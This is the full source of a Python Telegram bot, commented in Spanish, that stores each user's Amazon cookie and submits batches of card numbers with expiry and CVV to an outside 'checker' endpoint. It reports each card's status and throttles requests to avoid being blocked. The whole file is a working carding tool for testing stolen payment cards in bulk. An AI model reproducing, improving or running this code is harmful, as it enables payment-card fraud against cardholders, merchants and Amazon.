import re
import requests
import asyncio
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Diccionario para guardar cookies por usuario
user_cookies = {}

#Toma el token de railway
TOKEN = os.getenv("TOKEN")

# Regex para validar formato de tarjeta (16|2|4|3)
cc_regex = re.compile(r"^\d{16}\|\d{2}\|\d{4}\|\d{3}$")

# Endpoint
url = "https://leviatan-chk.site/amazon/leviatan"


# 🔹 /start → muestra comandos disponibles
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Comandos disponibles:\n\n"
        "/cookie TU_COOKIE → guardar cookie\n"
        "/cc → procesar tarjetas\n\n"
        "Formato:\n1234567890123456|11|2028|123"
    )


# 🔹 /cookie → guarda cookie del usuario
async def set_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Validar que envíe cookie
    if not context.args:
        await update.message.reply_text("❌ Usa: /cookie TU_COOKIE")
        return

    # Guardar cookie
    user_cookies[user_id] = " ".join(context.args)

    await update.message.reply_text("✅ cookie guardada con éxito")


# 🔹 función para hacer request (separada para evitar bloqueos)
def hacer_request(data, headers):
    return requests.post(url, json=data, headers=headers, timeout=20)


# 🔹 /cc → procesa tarjetas
async def cc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Verificar cookie
    if user_id not in user_cookies:
        await update.message.reply_text("❌ primero usa /cookie")
        return

    cookie = user_cookies[user_id]

    # Obtener texto sin comando
    text = update.message.text.replace("/cc", "").strip()
    lines = text.split("\n")

    # Filtrar tarjetas válidas
    valid = [l.strip() for l in lines if cc_regex.match(l.strip())]

    if not valid:
        await update.message.reply_text("❌ no hay tarjetas válidas")
        return

    total = len(valid)

    # Mensaje de progreso
    progress_msg = await update.message.reply_text(f"⏳ procesando 0/{total}")

    # Procesar una por una
    for i, tarjeta in enumerate(valid, start=1):

        # Payload (IMPORTANTE: "card", no "cc")
        data = {
            "card": tarjeta,
            "cookies": cookie
        }

        # Headers
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }

        try:
            # 🔹 Ejecutar request en hilo (evita que el bot se congele)
            response = await asyncio.to_thread(hacer_request, data, headers)

            # Validar HTTP
            if response.status_code != 200:
                await update.message.reply_text(
                    f"{i}. {tarjeta}\n❌ error HTTP: {response.status_code}"
                )
                continue

            # Convertir respuesta
            result = response.json()

            # Enviar resultado
            await update.message.reply_text(
                f"{i}. {tarjeta}\nStatus: {result.get('status')}\nMessage: {result.get('message')}"
            )

        except requests.exceptions.Timeout:
            await update.message.reply_text(
                f"{i}. {tarjeta}\n❌ error: tiempo de espera agotado"
            )

        except Exception:
            await update.message.reply_text(
                f"{i}. {tarjeta}\n❌ error al conectar con el endpoint"
            )

        # Actualizar progreso
        try:
            await progress_msg.edit_text(f"⏳ procesando {i}/{total}")
        except:
            pass

        # Delay para evitar bloqueos del servidor
        await asyncio.sleep(1)

    # Final
    await progress_msg.edit_text(f"✅ completado {total}/{total}")


# 🔹 mensaje desconocido
async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚠️ comando no válido, usa /start")


# 🔹 iniciar bot
app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("cookie", set_cookie))
app.add_handler(CommandHandler("cc", cc))  # comando cambiado aquí
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, unknown))

# Ejecutar bot
app.run_polling()
